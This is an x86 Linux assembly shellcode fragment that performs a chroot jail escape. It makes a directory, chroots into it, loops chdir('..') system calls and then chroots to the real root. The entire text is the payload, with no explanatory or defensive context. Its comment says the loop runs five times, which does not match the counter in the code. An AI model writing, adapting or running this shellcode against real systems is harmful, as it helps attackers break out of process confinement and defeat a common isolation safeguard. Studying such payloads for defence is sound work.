	.globl	cbegin
	.globl	cend


cbegin:
/* mkdir AA.. */
	cdq
	movl	$0x73507350,	%ecx
	push	%eax
	push	$0x2e2e4141
	movl	%esp,		%ebx
	movb	$0x27,		%al
	int	$0x80

/* chroot AA.. */
	movb	$0x3d,		%al
	int	$0x80

/* chdir .. x 5 */
	addb	$0x2,		%bl

cd_loop:
	incb	%dl
	movb	$0xc,		%al
	int	$0x80
	cmp	$0x6a,		%dl
	jne	cd_loop

/* chroot . */
	incb	%bl
	movb	$0x3d,		%al
	int	$0x80
cend:

